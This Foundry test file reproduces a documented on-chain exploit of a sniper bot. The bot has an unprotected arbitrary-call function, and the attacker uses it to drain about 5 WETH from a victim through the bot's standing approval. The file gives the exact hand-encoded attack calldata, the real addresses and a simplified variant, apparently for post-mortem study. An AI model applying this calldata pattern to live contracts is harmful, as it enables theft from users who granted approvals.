pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$12K (5.0499 WETH)
// Attacker : https://etherscan.io/address/0x0000daaee5fbc2d3fc5a5c0cb456d2c24e4f81de
// Attack Contract :
// Vulnerable Contract (sniper bot, UNVERIFIED) : https://etherscan.io/address/0x56974D5AF75B1eF96722052a57735187E9b91751
// Victim (whitelisted funder EOA) : 0x7c243E010E086cAaD737D47E5a40A59E8B79E92d
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x3f0dc68dc89fce3250b9d2de2611384b8af258e83f7a711f666917c5590d13d2

// @Info
// Vulnerable Contract Code : UNVERIFIED — analyzed from on-chain bytecode (see sources/Bot_56974D_bytecode.txt)

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1834432197375533433
// Twitter Guy : https://x.com/TenArmorAlert/status/1834432197375533433
// Hacking God :

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant attacker = 0x0000dAAee5FbC2d3fC5a5C0cB456d2c24e4F81dE;
address constant bot = 0x56974D5AF75B1eF96722052a57735187E9b91751; // vulnerable sniper bot (addr1)
address constant victim = 0x7c243E010E086cAaD737D47E5a40A59E8B79E92d; // whitelisted funder (addr2)

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545", 20738427);
    }

    // Faithful reproduction of the on-chain exploit.
    // The bot exposes an unprotected arbitrary-call function (selector 0x213d8e67):
    //   f(address token, bytes data, uint256, uint256) -> token.call(data)
    // The victim had previously granted the bot an (effectively) unlimited WETH
    // approval so the bot could trade on their behalf. The attacker abuses the
    // missing access control to make the bot execute
    //   WETH.transferFrom(victim, attacker, 5.0499e18)
    // pulling the victim's WETH using the bot's standing allowance.
    function testPoC() public {
        emit log_named_decimal_uint("attacker WETH before", IERC20(weth9).balanceOf(attacker), 18);
        emit log_named_decimal_uint("victim WETH before", IERC20(weth9).balanceOf(victim), 18);

        // Exact calldata of attack tx 0x3f0dc68d...d13d2:
        //   0x213d8e67(token=WETH, data=transferFrom(victim, attacker, 5049899842444876795), 0, 0)
        bytes memory attackCalldata = hex"213d8e67"
            hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2" // token = WETH
            hex"0000000000000000000000000000000000000000000000000000000000000080" // offset to bytes data
            hex"0000000000000000000000000000000000000000000000000000000000000000" // arg2 = 0
            hex"0000000000000000000000000000000000000000000000000000000000000000" // arg3 = 0
            hex"0000000000000000000000000000000000000000000000000000000000000064" // data.length = 100
            hex"23b872dd" // transferFrom selector
            hex"0000000000000000000000007c243e010e086caad737d47e5a40a59e8b79e92d" // from = victim
            hex"0000000000000000000000000000daaee5fbc2d3fc5a5c0cb456d2c24e4f81de" // to   = attacker
            hex"0000000000000000000000000000000000000000000000004614d926b43a5bfb" // amount = 5.0499e18
            hex"00000000000000000000000000000000000000000000000000000000"; // calldata padding

        vm.prank(attacker, attacker);
        (bool ok,) = bot.call(attackCalldata);
        require(ok, "exploit call reverted");

        emit log_named_decimal_uint("attacker WETH after", IERC20(weth9).balanceOf(attacker), 18);
        emit log_named_decimal_uint("victim WETH after", IERC20(weth9).balanceOf(victim), 18);
        assertEq(IERC20(weth9).balanceOf(attacker), 5049899842444876795, "attacker drained victim WETH");
    }

    // Original simplified PoC (kept for reference). It models only the *outcome*:
    // a standing allowance + transferFrom, without going through the bot's
    // unprotected entrypoint. The on-chain reality is `testPoC` above.
    function testPoC_Simplified() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(weth9).balanceOf(attacker), 18);
        vm.startPrank(victim);
        IERC20(weth9).approve(attacker, type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker, attacker);
        IERC20(weth9).transferFrom(victim, attacker, 5049899842444876795);
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(weth9).balanceOf(attacker), 18);
    }
}
